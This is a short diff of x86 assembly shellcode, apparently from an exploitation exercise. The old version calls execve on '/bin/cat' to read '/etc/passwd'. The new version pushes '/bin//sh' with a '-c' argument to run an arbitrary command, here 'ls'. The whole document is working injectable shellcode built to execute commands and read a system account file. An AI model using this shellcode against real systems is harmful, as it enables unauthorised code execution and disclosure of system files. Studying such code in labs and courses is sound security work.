@@ -9,12 +9,18 @@ callee:
         mov ecx, esi
         add cl, [eax]
         mov [ecx], dl
+        xor edx, edx
+        xor ecx, ecx
+        mov cx, 0x632d     /* "-c" */
+        push ecx
+        mov ecx, esp
         push edx
-        push 0x7461632f
-        push 0x6e69622f    /* "/bin/cat" */
+        push 0x68732f2f
+        push 0x6e69622f    /* "/bin//sh" */
         mov ebx, esp
         push edx
         push esi
+        push ecx
         push ebx
         mov ecx, esp
         lea eax, [edx+11]  /* execve */
@@ -22,5 +28,5 @@ callee:
 caller:
         call callee
 pstring:
-        .byte 11
-        .ascii "/etc/passwd"
+        .byte 2
+        .ascii "ls"
